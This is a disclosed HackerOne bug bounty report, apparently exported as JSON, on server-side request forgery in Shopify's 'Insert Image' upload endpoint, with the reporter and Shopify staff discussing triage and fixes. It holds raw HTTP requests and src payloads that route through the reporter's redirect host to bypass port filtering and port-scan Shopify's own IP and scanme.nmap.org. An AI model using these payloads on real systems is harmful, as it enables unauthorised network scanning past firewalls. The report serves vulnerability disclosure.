{"id":67389,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NzM4OQ==","url":"https://hackerone.com/reports/67389","title":"SSRF via 'Insert Image' feature of Products/Collections/Frontpage","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-06-11T09:05:59.151Z","submitted_at":"2015-06-11T09:05:59.151Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"alpha","url":"/alpha","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/005/246/e8b4598aaf81648969f1ebf4c96e63155092c651_original.jpeg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2015-08-24T14:47:13.085Z","bug_reporter_agreed_on_going_public_at":"2015-08-24T14:47:12.849Z","team_member_agreed_on_going_public_at":"2015-08-24T14:24:22.176Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi Security team,\r\n\r\nI would like to report an another SSRF issue like my previous [bug 67377] (https://hackerone.com/reports/67377). The description, threats, risks, exploatations are the same.\r\n\r\n The base request is the following\r\n```\r\nPOST /admin/settings/files.json HTTP/1.1\r\nHost: test-4925.myshopify.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0\r\nAccept: application/json, text/javascript, */*; q=0.01\r\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nX-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nX-Requested-With: XMLHttpRequest\r\nReferer: https://test-4925.myshopify.com/admin/collections/63278595\r\nContent-Length: 67\r\nCookie: COOKIES\r\n\r\nsrc=SOME_URL\r\n```\r\nIf `src` uses schemes that are not `http` or `https`, or the  another `port` then server responds with `HTTP/1.1 422 Unprocessable Entity`. At the same time we can bypass this filter using HTTP redirection trick below\r\n\r\n```\r\nPOST /admin/settings/files.json HTTP/1.1\r\nHost: test-4925.myshopify.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0\r\nAccept: application/json, text/javascript, */*; q=0.01\r\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nX-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nX-Requested-With: XMLHttpRequest\r\nReferer: https://test-4925.myshopify.com/admin/collections/63278595\r\nContent-Length: 67\r\nCookie: COOKIES\r\n\r\nsrc=http%3A%2F%2Fhettoteam.tk/r.php?r=http://hettoteam.tk:21\r\n```\r\nIf the server returns `HTTP/1.1 500 Internal Server Error` then the port is opened and if the server returns `HTTP/1.1 422 Unprocessable Entity` then the port is closed. \r\n\r\nExample of scanning ports for scanme.nmap.org host (TCP ports 1 - is closed, TCP port 22 - is opened):\r\n`src=http%3A%2F%2Fhettoteam.tk/r.php?r=http://scanme.nmap.org:1`: HTTP code is 422.\r\n`src=http%3A%2F%2Fhettoteam.tk/r.php?r=http://scanme.nmap.org:22`: HTTP code is 500 \r\n\r\nThe network dump is in attachment.\r\n\r\nCheers,\r\nDenis.","vulnerability_information_html":"\u003cp\u003eHi Security team,\u003c/p\u003e\n\n\u003cp\u003eI would like to report an another SSRF issue like my previous \u003ca href=\"https://hackerone.com/reports/67377\"\u003ebug 67377\u003c/a\u003e. The description, threats, risks, exploatations are the same.\u003c/p\u003e\n\n\u003cp\u003eThe base request is the following\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /admin/settings/files.json HTTP/1.1\nHost: test-4925.myshopify.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nX-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://test-4925.myshopify.com/admin/collections/63278595\nContent-Length: 67\nCookie: COOKIES\n\nsrc=SOME_URL\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf \u003ccode\u003esrc\u003c/code\u003e uses schemes that are not \u003ccode\u003ehttp\u003c/code\u003e or \u003ccode\u003ehttps\u003c/code\u003e, or the  another \u003ccode\u003eport\u003c/code\u003e then server responds with \u003ccode\u003eHTTP/1.1 422 Unprocessable Entity\u003c/code\u003e. At the same time we can bypass this filter using HTTP redirection trick below\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /admin/settings/files.json HTTP/1.1\nHost: test-4925.myshopify.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nX-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://test-4925.myshopify.com/admin/collections/63278595\nContent-Length: 67\nCookie: COOKIES\n\nsrc=http%3A%2F%2Fhettoteam.tk/r.php?r=http://hettoteam.tk:21\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf the server returns \u003ccode\u003eHTTP/1.1 500 Internal Server Error\u003c/code\u003e then the port is opened and if the server returns \u003ccode\u003eHTTP/1.1 422 Unprocessable Entity\u003c/code\u003e then the port is closed. \u003c/p\u003e\n\n\u003cp\u003eExample of scanning ports for scanme.nmap.org host (TCP ports 1 - is closed, TCP port 22 - is opened):\u003cbr\u003e\n\u003ccode\u003esrc=http%3A%2F%2Fhettoteam.tk/r.php?r=http://scanme.nmap.org:1\u003c/code\u003e: HTTP code is 422.\u003cbr\u003e\n\u003ccode\u003esrc=http%3A%2F%2Fhettoteam.tk/r.php?r=http://scanme.nmap.org:22\u003c/code\u003e: HTTP code is 500 \u003c/p\u003e\n\n\u003cp\u003eThe network dump is in attachment.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\nDenis.\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":57,"name":"Violation of Secure Design Principles"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":41031,"file_name":"http.pcapng","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/041/031/59cd1161089adca2bfbb0d843c316ea92beb8896/http.pcapng?response-content-disposition=attachment%3B%20filename%3D%22http.pcapng%22%3B%20filename%2A%3DUTF-8%27%27http.pcapng\u0026response-content-type=application%2Foctet-stream\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063642Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026X-Amz-Signature=37df85746b0cc7c2c32c965f43e4dadfc2be422e1f0f8018e94aa41c0d2bc4a9","file_size":3816,"type":"application/octet-stream"}],"allow_singular_disclosure_at":"2015-09-23T14:24:22.612Z","allow_singular_disclosure_after":-166205540.2147886,"singular_disclosure_allowed":true,"vote_count":3,"voters":["sw33tlie","hogarth45","b71614f2c5f23f3dd362439"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":460834,"is_internal":false,"editable":false,"type":"Activities::BugNotApplicable","message":"This feature is meant to connect to arbitrary hosts. We don't consider scanning the internet a security issue with Shopify.","markdown_message":"\u003cp\u003eThis feature is meant to connect to arbitrary hosts. We don\u0026#39;t consider scanning the internet a security issue with Shopify.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-06-11T15:29:43.136Z","updated_at":"2015-06-11T15:29:43.136Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":460952,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello. Could you please look at https://cwe.mitre.org/data/definitions/918.html resource? Using your feature it is possible to connect to arbitrary ports of any host including internal networks, bypassing ACL of firewalls and routers.\nEven if you think that this is a not vulnerability I do not understand why it has been marked as N/A? I described the issue correctly and I did not violate your Bug Bounty program's rules. If security team accepts a risk and does not want to fix issue a bug usually is marked as WONTFIX.","markdown_message":"\u003cp\u003eHello. Could you please look at \u003ca title=\"https://cwe.mitre.org/data/definitions/918.html\" href=\"/redirect?url=https%3A%2F%2Fcwe.mitre.org%2Fdata%2Fdefinitions%2F918.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://cwe.mitre.org/data/definitions/918.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e resource? Using your feature it is possible to connect to arbitrary ports of any host including internal networks, bypassing ACL of firewalls and routers.\u003cbr\u003e\nEven if you think that this is a not vulnerability I do not understand why it has been marked as N/A? I described the issue correctly and I did not violate your Bug Bounty program\u0026#39;s rules. If security team accepts a risk and does not want to fix issue a bug usually is marked as WONTFIX.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-06-11T16:45:19.829Z","updated_at":"2015-06-11T16:47:00.436Z","actor":{"username":"alpha","cleared":false,"url":"/alpha","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/246/e8b4598aaf81648969f1ebf4c96e63155092c651_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":460957,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It's not possible to connect to internal network hosts using that technique in Shopify.","markdown_message":"\u003cp\u003eIt\u0026#39;s not possible to connect to internal network hosts using that technique in Shopify.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-06-11T16:46:45.454Z","updated_at":"2015-06-11T16:46:45.454Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":461000,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"23.227.55.1 is your host. Port scanning from Internet shows that 21,23,22,80, etc ports are filtered (firewalled). But using SSRF and script above I can scan your network from your hosts: for example port 22 on 23.227.55.1 should be opened. So from Internet I can't scan ports and using this feature I can.","markdown_message":"\u003cp\u003e23.227.55.1 is your host. Port scanning from Internet shows that 21,23,22,80, etc ports are filtered (firewalled). But using SSRF and script above I can scan your network from your hosts: for example port 22 on 23.227.55.1 should be opened. So from Internet I can\u0026#39;t scan ports and using this feature I can.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-06-11T17:11:26.363Z","updated_at":"2015-06-11T17:13:19.132Z","actor":{"username":"alpha","cleared":false,"url":"/alpha","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/246/e8b4598aaf81648969f1ebf4c96e63155092c651_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":461013,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ok.","markdown_message":"\u003cp\u003eOk.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-06-11T17:29:34.157Z","updated_at":"2015-06-11T17:32:24.684Z","actor":{"username":"alpha","cleared":false,"url":"/alpha","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/246/e8b4598aaf81648969f1ebf4c96e63155092c651_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":461250,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"","markdown_message":"","automated_response":false,"created_at":"2015-06-11T20:20:44.099Z","updated_at":"2015-06-11T20:20:44.099Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":461251,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"You have a point, the protocol is not filtered on the redirection, and we also don't filter external IP addresses (though internal ones are properly filtered).","markdown_message":"\u003cp\u003eYou have a point, the protocol is not filtered on the redirection, and we also don\u0026#39;t filter external IP addresses (though internal ones are properly filtered).\u003c/p\u003e\n","automated_response":false,"created_at":"2015-06-11T20:21:00.495Z","updated_at":"2015-06-11T20:21:00.495Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":476623,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Added comments to another [SSRF via Add Image from URL bug] (https://hackerone.com/reports/67377) reported by me. Could you please review them. Thanks. ","markdown_message":"\u003cp\u003eAdded comments to another \u003ca href=\"https://hackerone.com/reports/67377\"\u003eSSRF via Add Image from URL bug\u003c/a\u003e reported by me. Could you please review them. Thanks. \u003c/p\u003e\n","automated_response":false,"created_at":"2015-06-18T17:32:16.902Z","updated_at":"2015-06-18T17:32:16.902Z","actor":{"username":"alpha","cleared":false,"url":"/alpha","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/246/e8b4598aaf81648969f1ebf4c96e63155092c651_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":476686,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"I pushed a fix for this issue today. Now the redirect target should be subject to the same rules as the source URL, which means we will only connect to port 80 for http and 443 for https. It's still possible to use the external address of an internal host to scan it, but only for port 80 and 443, which is acceptable since those are open externally anyway.","markdown_message":"\u003cp\u003eI pushed a fix for this issue today. Now the redirect target should be subject to the same rules as the source URL, which means we will only connect to port 80 for http and 443 for https. It\u0026#39;s still possible to use the external address of an internal host to scan it, but only for port 80 and 443, which is acceptable since those are open externally anyway.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-06-18T18:17:45.679Z","updated_at":"2015-06-18T18:17:45.679Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"alpha","url":"/alpha"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":477082,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I still can reproduce the issue:\n`src=http://hettoteam.tk/r.php?r=http://23.227.55.1:22/111111111` - port is opened\n`src=http://hettoteam.tk/r.php?r=http://23.227.55.1:2/111111111` - port is closed\n`src=http://hettoteam.tk/r.php?r=http://scanme.nmap.org:22/111111111` - port is opened\n`src=http://hettoteam.tk/r.php?r=http://scanme.nmap.org:2/111111111` - port is closed","markdown_message":"\u003cp\u003eI still can reproduce the issue:\u003cbr\u003e\n\u003ccode\u003esrc=http://hettoteam.tk/r.php?r=http://23.227.55.1:22/111111111\u003c/code\u003e - port is opened\u003cbr\u003e\n\u003ccode\u003esrc=http://hettoteam.tk/r.php?r=http://23.227.55.1:2/111111111\u003c/code\u003e - port is closed\u003cbr\u003e\n\u003ccode\u003esrc=http://hettoteam.tk/r.php?r=http://scanme.nmap.org:22/111111111\u003c/code\u003e - port is opened\u003cbr\u003e\n\u003ccode\u003esrc=http://hettoteam.tk/r.php?r=http://scanme.nmap.org:2/111111111\u003c/code\u003e - port is closed\u003c/p\u003e\n","automated_response":false,"created_at":"2015-06-19T02:51:51.584Z","updated_at":"2015-06-19T02:51:51.584Z","actor":{"username":"alpha","cleared":false,"url":"/alpha","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/246/e8b4598aaf81648969f1ebf4c96e63155092c651_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":477539,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"","markdown_message":"","automated_response":false,"created_at":"2015-06-19T17:32:42.730Z","updated_at":"2015-06-19T17:32:42.730Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":477541,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"You're right, I fixed #67377 but not this issue. It turns out they are separate issues, I thought both used the same file upload code which turns out not to be the case.","markdown_message":"\u003cp\u003eYou\u0026#39;re right, I fixed \u003ca href=\"/reports/67377\"\u003e#67377\u003c/a\u003e but not this issue. It turns out they are separate issues, I thought both used the same file upload code which turns out not to be the case.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-06-19T17:35:16.639Z","updated_at":"2015-06-19T17:35:16.639Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":492239,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello. Is there any update on this issue? [#67377] (https://hackerone.com/reports/67377) was fixed and verified, but this bug is still in `New` state.\nThank you.","markdown_message":"\u003cp\u003eHello. Is there any update on this issue? \u003ca href=\"https://hackerone.com/reports/67377\"\u003e#67377\u003c/a\u003e was fixed and verified, but this bug is still in \u003ccode\u003eNew\u003c/code\u003e state.\u003cbr\u003e\nThank you.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-06-26T03:51:44.629Z","updated_at":"2015-06-26T03:51:44.629Z","actor":{"username":"alpha","cleared":false,"url":"/alpha","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/246/e8b4598aaf81648969f1ebf4c96e63155092c651_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":508132,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi. Any news regarding this issue?","markdown_message":"\u003cp\u003eHi. Any news regarding this issue?\u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-14T06:10:38.054Z","updated_at":"2015-07-14T06:10:38.054Z","actor":{"username":"alpha","cleared":false,"url":"/alpha","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/246/e8b4598aaf81648969f1ebf4c96e63155092c651_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":508657,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"No news yet.","markdown_message":"\u003cp\u003eNo news yet.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-14T15:18:14.592Z","updated_at":"2015-07-14T15:18:14.592Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":508683,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry to disturb you. I just wondered because the bug is still in `New` state.","markdown_message":"\u003cp\u003eSorry to disturb you. I just wondered because the bug is still in \u003ccode\u003eNew\u003c/code\u003e state.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-14T15:36:46.355Z","updated_at":"2015-07-14T15:36:46.355Z","actor":{"username":"alpha","cleared":false,"url":"/alpha","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/246/e8b4598aaf81648969f1ebf4c96e63155092c651_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":512649,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"I've created an issue and our engineering team will look into fixing this bug as well. We currently have a huge backlog of issues so it may take weeks or months for us to fix the issue, depending on the complexity of the fix required. I should mention also that there is no need to ask for updates, we will give you updates as soon as we receive them.","markdown_message":"\u003cp\u003eI\u0026#39;ve created an issue and our engineering team will look into fixing this bug as well. We currently have a huge backlog of issues so it may take weeks or months for us to fix the issue, depending on the complexity of the fix required. I should mention also that there is no need to ask for updates, we will give you updates as soon as we receive them.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-16T21:50:29.583Z","updated_at":"2015-07-16T21:50:29.583Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":549035,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @alpha,\n\nThe bug is resolved, I assigned the bug to one of my colleague who will take it from here for the bounty. It will take a few more weeks before we make our next round of payouts, I'm sorry about the additional delay.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/alpha\"\u003e@alpha\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThe bug is resolved, I assigned the bug to one of my colleague who will take it from here for the bounty. It will take a few more weeks before we make our next round of payouts, I\u0026#39;m sorry about the additional delay.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-08-14T19:05:40.570Z","updated_at":"2015-08-14T19:05:40.570Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":560385,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify! As noted, this issue has been resolved.","markdown_message":"\u003cp\u003eThanks for helping improve the security of Shopify! As noted, this issue has been 